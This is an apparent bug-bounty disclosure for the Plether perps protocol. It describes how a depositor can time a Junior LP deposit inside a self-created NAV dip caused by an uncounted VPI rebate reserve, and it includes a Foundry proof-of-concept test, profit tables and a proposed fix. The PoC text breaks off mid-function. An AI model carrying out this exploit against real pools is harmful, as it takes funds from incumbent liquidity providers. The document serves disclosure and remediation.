# \#97983 [SC-Critical] A skew-reducing open pays its VPI rebate out of pool cash while NAV ignores the guaranteed clawback, so a depositor can activate Junior shares inside a self-created NAV dip and take incumbent Junior LPs' funds

**Submitted on Nov 4th 2026 at 07:35:52 UTC by @emanueldlvg for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #97983
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Protocol insolvency
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Affected contracts (in-scope commit `a82d4fef`; identical runtime code live on Arbitrum Sepolia v2.0.0)

The v2.0.0 runtime bytecode of every contract below matches an `a82d4fef` build, excluding immutables and metadata. The check was made at Arbitrum Sepolia block 325,810,548; the protocol lens, which `HousePool` deploys from its constructor, was checked on 2026-11-04. The proof of concept runs in the repository's Foundry suite at the in-scope commit. It uses the release risk parameters and the live v2.0.0 Router configuration, with Pyth mocked. No in-scope contract is modified.

| Contract | Arbitrum Sepolia v2.0.0 address | Role in the issue |
|---|---|---|
| `CfdEngineProtocolLens` (created by `HousePool`) | `0x82fc00d77e86c52e2480459d07ad6220f1106413` | **Root cause.** `getHousePoolInputSnapshot` builds LP pricing inputs from pool assets, trader claims and the terminal price delta only, omitting the negative-VPI reserve the pool is owed |
| `HousePool` (`HousePoolAccountingLib`) | `0xeb5604c393843b2f3c347ec24fa9ddad6ab2131e` | **Root cause.** `buildReconcileSnapshot`, the canonical entry/exit price, turns those inputs into NAV; deposits activate at it |
| `CfdEngineSettlementSidecar` | `0xd3ede337e042d5aa6ba68e03d0c885b3d4a062dc` | Trigger: pays the open's VPI rebate out of `HousePool` cash; returns the reserve to the pool at close or liquidation |
| `CfdEnginePlanner` (`CfdEnginePlanLib`, `CloseAccountingLib`) | `0x802a0755413fb966b397155b5c5cc0198e6bed3f` | Plans the rebate as a pool payout, and the close's lifetime clamp that forces it back |
| `TrancheVault` (Junior) | `0x4a8b67184a1e3224c11a191cc69f22c50eef734e` | Prices the activated deposit (`quoteDepositFromState`) and funds the later redemption |
| `MarginClearinghouse` | `0xb5b851f627d6df3cf3f096e23e20a58884d7b89a` | Holds the rebate in the trader's non-withdrawable negative-VPI reserve (correct bookkeeping; the fix only adds an aggregate) |
| `OrderRouter` | `0x918663d6da8cb33b325a04c4a5e8c51d42f3b444` | Public `commitOrder` / `executeOrder` / `settleLpEpoch` used by the attacker |

Release parameters used:
- risk: `vpiFactor` 0.01e18, `maxSkewRatio` 0.4e18, maintenance 10 bps, initial 20 bps, frozen-market 300 bps, `baseCarryBps` 500, liquidation `bountyBps` 10;
- execution fee 4 bps, LP epoch 1 hour, LP deposit cooldown 1 hour;
- Senior cap 40,000,000 USDG and 80% of the pool.

## Brief/Intro

A trader whose open reduces the pool's skew earns a negative VPI, a rebate. The Engine pays that rebate immediately out of `HousePool` cash and locks the same amount in the trader's non-withdrawable negative-VPI reserve. The lifetime VPI clamp then guarantees the full amount returns to the pool when the position closes or is liquidated. Economically, the rebate is a temporary transfer the pool is certain to get back.

LP NAV does not see that. The NAV used to price deposit activations and redemptions is pool assets minus trader claims plus the terminal price delta, and the reserve sits outside all three. So every rebate-paying open lowers Junior NAV by the rebate until the position closes, and an unprivileged actor can create that dip on demand.

An attacker who has queued a Junior deposit opens a skew-reducing position just before the hourly LP epoch boundary. It lets the epoch settle, which activates its deposit at the dipped Junior price, and then closes the position. The clamp returns the rebate to the pool, Junior NAV recovers, and the attacker redeems its oversized share of the recovered value after the one-hour cooldown. Incumbent Junior LPs bear the difference.

The main proof of concept uses the minimum profitable setup:
- **Pool:** 50M USDG, with Senior at the 40M release cap and Junior at 10M.
- **Market:** ordinary traders hold a 12.5M LONG, so organic skew is 25% of depth.
- **Attacker:** a Junior deposit equal to the incumbent tranche (10M), plus the SHORT size that maximises its net for that deposit (4.5M).

End to end, the attacker starts one cycle with 11,000,000.00 USDG: the 10,000,000 USDG deposit plus 1,000,000 USDG of trading collateral. It finishes with 11,000,648.11 USDG, an absolute profit of +648.11 USDG; three cycles yield +1,948.89 USDG. The cycle moves 9,221.75 USDG of pool cash out as a rebate. A control run from the same snapshot makes the same deposit and redemption without the skew-reducing trade, which isolates the trade's effect. Against that control, the attacker's redemption is 4,616.26 USDG higher, exactly its 50% share of the dip. After 3,602.42 USDG of fees and carry, the trade is worth +1,013.84 USDG versus an honest LP round trip. Incumbent Junior LPs lose 4,614.04 USDG per cycle compared with control, and 13,846.76 USDG over three cycles. Larger skew or a larger deposit increases both sides. At the 40% skew cap with a 40M deposit, the attacker's absolute profit is +17,398.42 USDG, and incumbents lose 29,983.33 USDG per cycle.

## Vulnerability Details

**Root cause.** The defect is in the LP pricing path:
- `CfdEngineProtocolLens.getHousePoolInputSnapshot` builds the snapshot that prices LP entry and exit;
- `HousePoolAccountingLib.buildReconcileSnapshot`, inside `HousePool`, turns it into the canonical entry/exit price.

Together they value the pool from its current cash, trader claims and the terminal price delta. They never count the negative-VPI reserve, which the protocol is certain to return to the pool. The open's rebate payout is what moves that money out of the counted assets.

### A skew-reducing open is paid its rebate out of pool cash

`CfdEnginePlanLib` plans a negative trade cost as a pool payout, and requires the account to fund the negative-VPI reserve target `max(-vpiAccrued, 0)` (CfdEnginePlanLib.sol lines 331–352):

```solidity
delta.tradeCostAssets = openState.tradeCostAssets;
delta.marginDeltaAssets = order.marginDelta;
delta.poolRebatePayoutAssets = openState.tradeCostAssets < 0 ? uint256(-openState.tradeCostAssets) : 0;
...
delta.vpiRebateReserveAfterAssets =
    _negativeVpiReserveTarget(effectiveSnap.position.vpiAccrued + openState.vpiAssets);
```

`CfdEngineSettlementSidecar.executeOpen` then moves the cash out of the pool to the clearinghouse (lines 442–444):

```solidity
if (delta.poolRebatePayoutAssets > 0) {
    IHousePool(host.pool()).payOut(host.clearinghouse(), delta.poolRebatePayoutAssets);
}
```

The rebate is locked in the trader's negative-VPI reserve, which cannot be withdrawn, and `pool.totalAssets()` falls by the full rebate. In the proof, the attacker's 4.5M SHORT reduces a 12.5M organic skew to 8M. That pays 9,221.749449 USDG out of the pool.

### The lifetime clamp guarantees that the rebate comes back

At close, `CloseAccountingLib.buildCloseState` clamps lifetime VPI at zero (lines 111–118):

```solidity
// Clamp so lifetime VPI (accrued + delta) never goes negative. Prevents LP sandwich attacks
// where an attacker opens at high depth, reduces pool depth, then closes to extract a
// net-negative lifetime VPI rebate. ...
if (state.proportionalAccrualAssets + state.vpiDeltaAssets < 0) {
    state.vpiDeltaAssets = -state.proportionalAccrualAssets;
}
```

The settlement sidecar consumes the reserve into the pool for that clawback on close (`CfdEngineSettlementSidecar.sol` line 692) and on liquidation (line 803). In every exit path, the full rebate returns to `HousePool`. The protocol is therefore certain to recover it. The comment shows the clamp was written to stop VPI extraction from LPs, but it protects only the trader-side round trip.

### LP NAV ignores the reserve, so the dip is priced into LP shares

The pool input snapshot uses only the pool's assets, trader claims and the terminal price delta (`CfdEngineProtocolLens.getHousePoolInputSnapshot`, lines 62–73):

```solidity
uint256 poolAssets = engineContract.pool().totalAssets();
snapshot.physicalAssets = poolAssets;
...
snapshot.terminalLpPriceDeltaAssets = terminalSnapshot.terminalLpPriceDeltaAssets;
snapshot.traderClaimBalanceAssets = terminalSnapshot.totalTraderClaimsAssets;
```

`HousePoolAccountingLib.buildReconcileSnapshot` is "the single canonical terminal-NAV snapshot shared by LP entry and exit pricing" (lines 57–77). It computes `distributable = physicalAssets + terminalDelta − traderClaims`. The terminal price book caps each position's receivable at PnL pledge plus same-account claim (`TerminalNavBookV2.sol` lines 431–434), and the negative-VPI reserve is neither. While the attacker's position is open, Junior NAV is therefore understated by the full rebate. Losses are charged to Junior first, and recovered revenue restores Junior after the Senior high-water mark.

Deposit activation in `HousePool._settleLpEpoch` reconciles and then prices the matured deposit through `TrancheVault.quoteDepositFromState` (TrancheVault.sol lines 1398–1410) at that NAV. No entry gate checks for outstanding negative-VPI reserves. The activated shares are issued against an NAV that is too low by the rebate.

### After the close, NAV recovers and the entrant redeems at the restored price

When the attacker closes, the clamp charges back the full rebate, the reserve returns to the pool, and Junior NAV recovers. The attacker now holds a larger fraction of Junior than its deposit paid for. Its redemption after the one-hour cooldown captures that fraction of the recovered rebate: 50% in the main proof, where its deposit equals the incumbent tranche. Incumbent Junior holders, whose share of the same NAV was diluted at the dipped price, lose the same amount.

### Relation to documentation and published findings

- **The NAV exclusion is stated as design, but only to avoid inflating NAV.** `SECURITY.md` ("Exact symmetric LP NAV") and `ACCOUNTING_SPEC.md` (lines 1064–1066) say that neither anticipated VPI nor its reserve "inflates" terminal `K` or symmetric LP NAV. That keeps unearned future charges out of NAV. It does not address the opposite case here: cash already paid out of the pool against a guaranteed return deflates NAV, and an entrant can buy at the deflated price. These sections are not known-issue sections.
- **Carry has an explicit timing policy; VPI has none.** `ACCOUNTING_SPEC.md` (lines 731–740) explicitly accepts that incoming LPs may share old *carry* under a collection-time ownership policy. No equivalent statement exists for VPI rebates, which are an actual outflow of LP cash rather than uncollected revenue.

## Exploitation

The proof of concept uses the repository's `BasePerpTest` stack with the release risk parameters and the live v2.0.0 Router configuration. Orders go through the public V3 `commitOrder` / `executeOrder` path, and LP settlement through the public `OrderRouter.settleLpEpoch`. Prices come from the suite's Pyth mock; no in-scope contract is modified. Each run is compared with a control branch from the same EVM snapshot, identical except that the attacker does not open and close its SHORT. Every open in the proof posts 2% margin.

Main test, minimum profitable setup:

1. The pool holds a 40,000,000 USDG Senior tranche (the release cap) and a 10,000,000 USDG Junior tranche, plus the two 1,000 USDG seeds. An ordinary trader opens a 12,500,000 USDG LONG, so skew is 25% of pool depth. Pool depth is then 50,017,624.38 USDG, and the incumbent Junior position is worth 9,990,321.92 USDG.
2. The attacker requests a 10,000,000 USDG Junior deposit for the next LP epoch. That equals the incumbent tranche.
3. Shortly before the epoch boundary, the attacker opens a 4,500,000 USDG SHORT with 90,000 USDG margin through the Router. The open reduces skew from 12.5M to 8M, and the pool pays a 9,221.749449 USDG VPI rebate out of its cash into the attacker's non-withdrawable reserve.
4. The epoch starts and anyone calls `OrderRouter.settleLpEpoch`. The attacker's deposit activates at the dipped Junior price, and it claims its shares.
5. The attacker closes the SHORT. The lifetime clamp charges the full rebate back, the reserve returns to the pool, and Junior NAV recovers.
6. After the one-hour cooldown the attacker requests redemption of all its Junior shares. The next settlement funds it, and the attacker claims 10,004,250.53 USDG. The control run returns 9,999,634.27 USDG.
7. Result for one cycle, end to end:
   - The attacker started with 11,000,000.00 USDG: the 10,000,000 USDG deposit plus 1,000,000 USDG of collateral. It ends with 11,000,648.11 USDG: 10,004,250.53 USDG redeemed plus 996,397.58 USDG of collateral left. That is an absolute profit of +648.11 USDG.
   - Against the control, which makes the same deposit and redemption without the trade, the attacker's redemption is 4,616.26 USDG higher: its 50% share of the 9,221.75 USDG dip.
   - Its trading cost (execution fees and carry; the VPI round trip nets to zero) is 3,602.42 USDG, so the trade is worth +1,013.84 USDG more than an honest round trip. The control's own round trip returns 365.73 USDG less than deposited, because Junior pays the ordinary Senior coupon over the two hours.
   - The incumbent Junior position falls by 5,344.51 USDG, from 9,990,321.92 to 9,984,977.41 USDG. In control it falls by only 730.47 USDG, to 9,989,591.45 USDG, from the same Senior coupon. The attack therefore costs the incumbent 4,614.04 USDG.
8. Three cycles in a row, while the organic skew persists, give the attacker an absolute profit of +1,948.89 USDG. They take 13,846.76 USDG from the incumbent, whose position ends at 9,974,282.85 USDG against 9,988,129.61 USDG in control.

The sensitivity test repeats one cycle for larger skew and deposit sizes, plus a row at the live testnet's skew ratio. In every row, incumbents lose the attacker's captured share of the rebate, and the attacker's net is positive.

## Impact Details

Incumbent Junior LPs lose funds to an unprivileged attacker. The value moved is the rebate cash that left the pool and that the clamp returns to it. The attacker buys Junior shares while that cash is outside NAV and redeems after it is back. In the main proof, the incumbent Junior position is already below its 10,000,000 USDG principal because of the ordinary Senior coupon in both branches, and every cycle lowers it by a further 4,614.04 USDG. The loss is therefore taken from LP principal, not only from yield, and it compounds per cycle: 13,846.76 USDG over three. This is direct theft of user funds (Critical). 

**What the attacker needs.** For organic skew `S`, pool depth `D` and an attacker SHORT of size `N`:
- **Rebate:** approximately `vpiFactor × (S² − (S − N)²) / (2 × D)`.
- **Capture:** the attacker receives its share of post-deposit Junior, `f`, times the rebate.
- **Cost:** two 4 bps execution fees on `N`, plus a few minutes of carry.
- **Profit condition:** with the best `N` (about `S − 0.08 × D / f`), the attack profits when skew exceeds about `8% / f` of depth. That is 16% of depth for a deposit equal to the Junior tranche (`f = 0.5`), and about 10% for a deposit four times Junior (`f = 0.8`).

Incumbents lose `f × rebate` whether or not the attacker profits.

| Organic skew (share of depth) | Attacker Junior deposit | Attacker SHORT | Rebate | Attacker absolute profit / cycle | Attacker vs control / cycle | Incumbent loss / cycle |
| --- | ---: | ---: | ---: | ---: | ---: | ---: |
| 12.5M (25%), main test | 10M (= Junior) | 4.5M | 9,221.75 | +648.11 | +1,013.84 | −4,614.04 |
| 12.5M (25%) | 20M | 6.5M | 12,020.76 | +2,330.24 | +2,817.80 | −8,018.00 |
| 20M (40%, the skew cap) | 10M | 12M | 33,571.80 | +6,828.07 | +7,193.36 | −16,793.56 |
| 20M (40%) | 40M | 15M | 37,468.53 | +17,398.42 | +17,983.13 | −29,983.33 |
| 7.75M (15.5%, live testnet ratio) | 40M | 2.75M | 3,505.69 | +20.34 (break-even) | +605.44 | −2,805.64 |

**Market condition.** The attack needs a one-sided book that is large relative to pool depth.
- **One-sided books are normal.** At Arbitrum Sepolia block 325,875,489 the live v2.0.0 book holds 16.55M LONG against 0.21M SHORT open interest, so 98.8% of open interest is on one side. That imbalance is 15.5% of the 102.08M USDG pool, the last row above. The protocol itself admits skew up to 40% of depth.
- **It is repeatable while the skew lasts.** Each cycle takes about two hours (one deposit epoch, the one-hour cooldown, one redemption epoch) and can be repeated while the skew persists.
- **Ordinary depositors capture the dip too.** Any depositor whose activation lands while a rebate-paying position is open is mispriced the same way, at the incumbents' expense.

**Capital and risk.** The deposit is locked for about two hours and returned in full with the profit. The program states that capital requirements below USD 100 million are not a downgrade reason. The trade needs only ordinary margin, 2% in the proof. The SHORT's price exposure lasts from just before the epoch boundary until the settlement after it, and can be hedged off-chain.

## Recommendation

Count the negative-VPI reserve as a pool receivable in LP NAV. The reserve is backed one-for-one, cannot be withdrawn, and is certain to return to the pool through the lifetime clamp at close (`CfdEngineSettlementSidecar.sol` line 692) or liquidation (line 803). Pricing should therefore treat it like any other marked receivable: it counts for ownership pricing, and stays unavailable for redemption funding until the cash is physically back.

The change below keeps an aggregate of the reserve in `MarginClearinghouse`, exposes it through the pool input snapshot, and adds it to the canonical entry/exit pricing snapshot. Withdrawal and redemption funding keep using `physicalAssets` only, so no redemption can be funded from the receivable.

```diff
--- a/packages/perps/src/MarginClearinghouse.sol
+++ b/packages/perps/src/MarginClearinghouse.sol
     mapping(address => uint256) internal vpiRebateReserveBalances;
+    /// @notice Aggregate negative-VPI backing, certain to return to HousePool through the lifetime clamp.
+    uint256 public totalVpiRebateReserveAssets;
 ...
     // lockVpiRebateReserve and reclassifyPnlPledgeToVpiRebateReserve
         vpiRebateReserveBalances[account] += amountAssets;
+        totalVpiRebateReserveAssets += amountAssets;
 ...
     // releaseVpiRebateReserve and consumeVpiRebateReserve
         vpiRebateReserveBalances[account] -= amountAssets;
+        totalVpiRebateReserveAssets -= amountAssets;

--- a/packages/perps/src/interfaces/IMarginClearinghouse.sol
+++ b/packages/perps/src/interfaces/IMarginClearinghouse.sol
+    function totalVpiRebateReserveAssets() external view returns (uint256);

--- a/packages/perps/src/interfaces/HousePoolEngineViewTypes.sol
+++ b/packages/perps/src/interfaces/HousePoolEngineViewTypes.sol
         uint256 maxMarkStaleness;
+        uint256 vpiRebateReceivableAssets;
     }

--- a/packages/perps/src/CfdEngineProtocolLens.sol
+++ b/packages/perps/src/CfdEngineProtocolLens.sol
         snapshot.traderClaimBalanceAssets = terminalSnapshot.totalTraderClaimsAssets;
+        snapshot.vpiRebateReceivableAssets =
+            IMarginClearinghouse(engineContract.clearinghouse()).totalVpiRebateReserveAssets();

--- a/packages/perps/src/libraries/HousePoolAccountingLib.sol
+++ b/packages/perps/src/libraries/HousePoolAccountingLib.sol
-        uint256 terminalAssets = engineSnapshot.physicalAssets;
+        uint256 terminalAssets = engineSnapshot.physicalAssets + engineSnapshot.vpiRebateReceivableAssets;
```

With this change, an open that pays a rebate moves cash out (`physicalAssets − R`) and adds the same receivable (`+ R`), so NAV is unchanged. When the clamp returns the cash, the receivable falls by the same amount, so nothing is counted twice. Redeeming LPs are also no longer underpaid during an open rebate.

**Validation.**
- **The exploit stops paying.** Applied to `a82d4fef`, the change makes the proof of concept above stop paying: in the minimum setup, the attacker's LP gain falls from +4,616.26 to +1.11 USDG (rounding), its net becomes its −3,601.31 USDG of fees, and incumbent Junior LPs no longer lose value (+1.11 USDG).
- **Existing behaviour holds.** The repository's existing VPI and HousePool tests still pass with the change, 43 tests in nine suites: `VpiRebateReserve`, `VpiRoundTripAccounting`, `VpiDepth`, `HousePoolSnapshotParity`, `HousePoolDeposits` and `HousePoolLiquidationAccounting`.

**Alternatives.**
- **Keep the cash inside the pool until close.** The open would credit the reserve without moving cash, so the rebate never leaves the pool. That changes more accounting paths.
- **Block deposit activation while reserves are outstanding.** This is weaker, and opens a deposit-delay grief.

Add a regression test that activates a deposit while a rebate-paying position is open, closes the position, redeems, and asserts that incumbent tranche value is unchanged within rounding.

## Proof of Concept

Save the test below as `packages/perps/test/perps/poc/VpiRebateNavDip.t.sol` and run it from the repository root:

```bash
forge test --root packages/perps --match-contract VpiRebateNavDipPoC -vv
```

The file contains three tests:
- the minimum-setup cycle;
- the minimum setup repeated three times;
- a sensitivity run over larger skew and deposit sizes and the live testnet's skew ratio.

Each inherits the suite's `BasePerpTest`. It overrides `_riskParams()` with the release values and sets the initial tranche deposits to 40,000,000 USDG Senior (the release cap) and 10,000,000 USDG Junior. It applies the live v2.0.0 Router configuration through the suite's admin helper. Prices come from the suite's `MockPyth`; no in-scope contract is modified. Each case reports two things:
- **The attacker's absolute end-to-end result:** money in (deposit and collateral) against money out (redeemed USDG and remaining collateral). The tests assert that it is positive.
- **A control branch from the same EVM snapshot:** the same attacker deposit and redemption at the same times, but without the skew-reducing trade. Attack minus control isolates the effect of the trade from the ordinary Senior coupon and rounding over the two hours.

The suite's Router is the repository's test harness, which only adds a legacy scalar `commitOrder` overload. The proof uses the production V3 `commitOrder(OrderRequest)`, `executeOrder` and `settleLpEpoch` entry points.

### Complete test:

<details>
<summary>Complete test </summary>

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";

/// @notice A skew-reducing open is paid its VPI rebate in pool cash, so Junior NAV dips by the rebate while the rebate
///         sits in a reserve that the lifetime clamp is certain to return to the pool at close. An LP that times its
///         Junior deposit activation inside that self-created dip buys Junior below its economic value and redeems after
///         the clawback, taking value from incumbent Junior LPs.
///
///         The main tests use the minimum profitable setup: organic skew of 25% of pool depth, an attacker Junior
///         deposit equal to the incumbent Junior tranche, and the SHORT size that maximises the attacker's net for those.
contract VpiRebateNavDipPoC is BasePerpTest {

    address internal constant ORGANIC_LONG = address(0x0711);
    address internal constant ATTACKER = address(0xBADBAD);
    address internal constant KEEPER = address(0xE0EC);

    uint256 internal constant PRICE = 1e8;
    // Minimum profitable setup (pool depth ~50,002,000 USDG: Senior 40M at the release cap, Junior 10M).
    uint256 internal constant MIN_ORGANIC_LONG_SIZE = 12_500_000e18; // organic skew = 25% of pool depth
    uint256 internal constant MIN_ATTACKER_DEPOSIT = 10_000_000e6; // = the incumbent Junior tranche
    uint256 internal constant MIN_ATTACKER_SHORT_SIZE = 4_500_000e18; // optimal for the two values above
    uint256 internal constant MARGIN_BPS = 200; // 2% margin on every open

    uint256 internal orderNonce;
    uint256 internal depositSize;
    uint256 internal shortSize;

    struct Outcome {
        uint256 attackerUsdgFromLp;
        int256 attackerTradingResult;
        uint256 incumbentJuniorValue;
        uint256 dip;
    }

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 10_000_000e6;
    }

    function _initialSeniorDeposit() internal pure override returns (uint256) {
        return 40_000_000e6; // at the release Senior cap (40,000,000 USDG, 80% of the pool)
    }

    function setUp() public override {
        super.setUp();
        _applyReleaseRouterConfig();
        _fundTrader(ORGANIC_LONG, 2_000_000e6);
        _fundTrader(ATTACKER, 1_000_000e6);
        _refreshMark(PRICE);
    }

    /// @notice One cycle with the minimum profitable setup.
    function test_MinimumSetup_OneCycleTakesIncumbentJuniorValue() external {
        _openOrganicLong(MIN_ORGANIC_LONG_SIZE);
        depositSize = MIN_ATTACKER_DEPOSIT;
        shortSize = MIN_ATTACKER_SHORT_SIZE;
        uint256 depositRequest = _requestAttackerDeposit();

        uint256 incumbentBefore = juniorVault.convertToAssets(juniorVault.balanceOf(address(this)));
        uint256 depthBefore = pool.totalAssets();
        // The attacker's own money: the escrowed Junior deposit plus its trading collateral.
        uint256 attackerMoneyBefore = depositSize + clearinghouse.balanceAssets(ATTACKER);
        uint256 snapshot = vm.snapshotState();
        Outcome memory attack = _run(depositRequest, true);
        vm.revertToState(snapshot);
        Outcome memory control = _run(depositRequest, false);

        emit log_named_decimal_uint("pool depth before the attack (USDG)", depthBefore, 6);
        emit log_named_decimal_uint("organic LONG notional (USDG)", MIN_ORGANIC_LONG_SIZE / 1e12, 6);
        emit log_named_decimal_uint("attacker Junior deposit (USDG)", depositSize, 6);
        emit log_named_decimal_uint("attacker SHORT notional (USDG)", shortSize / 1e12, 6);
        emit log_named_decimal_uint("incumbent Junior principal deposited (USDG)", _initialJuniorDeposit(), 6);
        emit log_named_decimal_uint("incumbent Junior value before the attack (USDG)", incumbentBefore, 6);
        emit log_named_decimal_uint("pool cash paid out as VPI rebate (the NAV dip)", attack.dip, 6);
        emit log_named_decimal_uint("attacker LP redemption, control (USDG)", control.attackerUsdgFromLp, 6);
        emit log_named_decimal_uint("attacker LP redemption, attack (USDG)", attack.attackerUsdgFromLp, 6);
        int256 lpGain = int256(attack.attackerUsdgFromLp) - int256(control.attackerUsdgFromLp);
        emit log_named_decimal_int("attacker LP gain from the dip (USDG)", lpGain, 6);
        emit log_named_decimal_int("attacker trading result: fees, VPI, carry (USDG)", attack.attackerTradingResult, 6);
        emit log_named_decimal_int("attacker net vs control (USDG)", lpGain + attack.attackerTradingResult, 6);
        int256 absoluteProfit = _absoluteNet(attack);
        emit log_named_decimal_uint("END TO END: attacker money before (deposit + collateral, USDG)", attackerMoneyBefore, 6);
        emit log_named_decimal_uint(
            "END TO END: attacker money after (redeemed USDG + collateral, USDG)",
            uint256(int256(attackerMoneyBefore) + absoluteProfit),
            6
        );
        emit log_named_decimal_int("END TO END: attacker absolute profit (USDG)", absoluteProfit, 6);
        emit log_named_decimal_int(
            "END TO END: incumbent Junior value change, attack (USDG)",
            int256(attack.incumbentJuniorValue) - int256(incumbentBefore),
            6
        );
        emit log_named_decimal_int(
            "END TO END: incumbent Junior value change, control (USDG)",
            int256(control.incumbentJuniorValue) - int256(incumbentBefore),
            6
        );
        emit log_named_decimal_uint("incumbent Junior value, control (USDG)", control.incumbentJuniorValue, 6);
        emit log_named_decimal_uint("incumbent Junior value, attack (USDG)", attack.incumbentJuniorValue, 6);
        emit log_named_decimal_int(
            "incumbent Junior LP loss (USDG)",
            int256(attack.incumbentJuniorValue) - int256(control.incumbentJuniorValue),
            6
        );
        assertGt(absoluteProfit, 0, "attacker ends with less money than it started with");
        assertGt(lpGain + attack.attackerTradingResult, 0, "attacker does not profit versus an honest round trip");
        assertLt(attack.incumbentJuniorValue, control.incumbentJuniorValue, "incumbents not diluted");
    }

    /// @notice The minimum setup repeated three times while the organic skew persists; the loss compounds.
    function test_MinimumSetup_ThreeCyclesCompoundTheIncumbentLoss() external {
        _openOrganicLong(MIN_ORGANIC_LONG_SIZE);
        depositSize = MIN_ATTACKER_DEPOSIT;
        shortSize = MIN_ATTACKER_SHORT_SIZE;
        uint256 incumbentBefore = juniorVault.convertToAssets(juniorVault.balanceOf(address(this)));
        uint256 snapshot = vm.snapshotState();
        (int256 attackerNet, uint256 incumbentAttack) = _cycles(3, true);
        vm.revertToState(snapshot);
        (int256 controlNet, uint256 incumbentControl) = _cycles(3, false);
        emit log_named_decimal_uint("incumbent Junior value before the cycles (USDG)", incumbentBefore, 6);
        emit log_named_decimal_uint("incumbent Junior value after 3 control cycles (USDG)", incumbentControl, 6);
        emit log_named_decimal_uint("incumbent Junior value after 3 attack cycles (USDG)", incumbentAttack, 6);
        emit log_named_decimal_int(
            "incumbent Junior LP loss over 3 cycles (USDG)", int256(incumbentAttack) - int256(incumbentControl), 6
        );
        emit log_named_decimal_int("END TO END: attacker absolute profit over 3 cycles (USDG)", attackerNet, 6);
        emit log_named_decimal_int("attacker net over 3 cycles vs control (USDG)", attackerNet - controlNet, 6);
        assertGt(attackerNet, 0, "attacker ends with less money than it started with");
        assertLt(incumbentAttack, incumbentControl, "incumbents not diluted");
        assertGt(attackerNet, controlNet, "attacker did not gain");
    }

    /// @notice How the result scales with organic skew and the attacker's deposit (SHORT size optimal for each row).
    ///         The last row uses the live testnet's skew ratio (about 15.5% of depth), where the attack only breaks even.
    function test_Sensitivity() external {
        uint256[5] memory organic =
            [uint256(12_500_000e18), 12_500_000e18, 20_000_000e18, 20_000_000e18, 7_750_000e18];
        uint256[5] memory deposits = [uint256(10_000_000e6), 20_000_000e6, 10_000_000e6, 40_000_000e6, 40_000_000e6];
        uint256[5] memory shorts =
            [uint256(4_500_000e18), 6_500_000e18, 12_000_000e18, 15_000_000e18, 2_750_000e18];
        uint256 base = vm.snapshotState();
        for (uint256 i; i < 5; ++i) {
            _openOrganicLong(organic[i]);
            depositSize = deposits[i];
            shortSize = shorts[i];
            uint256 depositRequest = _requestAttackerDeposit();
            uint256 snapshot = vm.snapshotState();
            Outcome memory attack = _run(depositRequest, true);
            vm.revertToState(snapshot);
            Outcome memory control = _run(depositRequest, false);
            int256 net =
                int256(attack.attackerUsdgFromLp) - int256(control.attackerUsdgFromLp) + attack.attackerTradingResult;
            int256 incumbentLoss = int256(attack.incumbentJuniorValue) - int256(control.incumbentJuniorValue);
            emit log_named_decimal_uint("== organic skew (USDG)", organic[i] / 1e12, 6);
            emit log_named_decimal_uint("   attacker Junior deposit (USDG)", depositSize, 6);
            emit log_named_decimal_uint("   attacker SHORT notional (USDG)", shortSize / 1e12, 6);
            emit log_named_decimal_uint("   rebate paid out of the pool (USDG)", attack.dip, 6);
            emit log_named_decimal_int("   attacker absolute profit (USDG)", _absoluteNet(attack), 6);
            emit log_named_decimal_int("   attacker net vs control (USDG)", net, 6);
            emit log_named_decimal_int("   incumbent Junior LP loss vs control (USDG)", incumbentLoss, 6);
            assertLt(incumbentLoss, 0, "incumbents not diluted");
            vm.revertToState(base);
        }
    }

    // --- Scenario steps ---

    /// @dev Money out minus money in for the attacker: redeemed USDG minus the deposit, plus the change in collateral.
    function _absoluteNet(
        Outcome memory out
    ) internal view returns (int256) {
        return int256(out.attackerUsdgFromLp) - int256(depositSize) + out.attackerTradingResult;
    }

    function _openOrganicLong(
        uint256 size
    ) internal {
        _openOrder(ORGANIC_LONG, CfdTypes.Side.LONG, size, size / 1e12 * MARGIN_BPS / 10_000);
    }

    function _requestAttackerDeposit() internal returns (uint256 depositRequest) {
        settlementToken.mint(ATTACKER, depositSize);
        vm.startPrank(ATTACKER);
        settlementToken.approve(address(juniorVault), depositSize);
        depositRequest = juniorVault.requestDeposit(depositSize, ATTACKER, ATTACKER);
        vm.stopPrank();
    }

    function _cycles(
        uint256 count,
        bool attack
    ) internal returns (int256 attackerNet, uint256 incumbentValue) {
        for (uint256 i; i < count; ++i) {
            uint256 depositRequest = _requestAttackerDeposit();
            Outcome memory out = _run(depositRequest, attack);
            attackerNet += int256(out.attackerUsdgFromLp) - int256(depositSize) + out.attackerTradingResult;
            incumbentValue = out.incumbentJuniorValue;
            _refreshMark(PRICE);
        }
    }

    function _run(
        uint256 depositRequest,
        bool attack
    ) internal returns (Outcome memory out) {
        uint256 attackerTradingStart = clearinghouse.balanceAssets(ATTACKER);
        // Just before the epoch boundary, the attacker reduces the skew and is paid the VPI rebate from pool cash.
        if (attack) {
            uint256 poolBefore = pool.totalAssets();
            _openOrder(ATTACKER, CfdTypes.Side.SHORT, shortSize, shortSize / 1e12 * MARGIN_BPS / 10_000);
            out.dip = poolBefore - pool.totalAssets();
        }

        // Anyone settles the epoch: the deposit activates at the dipped Junior price.
        uint256 maturity = juniorVault.depositEpochStart(depositRequest);
        if (vm.getBlockTimestamp() < maturity) {
            vm.warp(maturity);
        }
        _refreshMark(PRICE);
        _settleViaRouter();
        uint256 claimable = juniorVault.claimableDepositRequest(depositRequest, ATTACKER);
        assertEq(claimable, depositSize, "deposit not activated");
        vm.prank(ATTACKER);
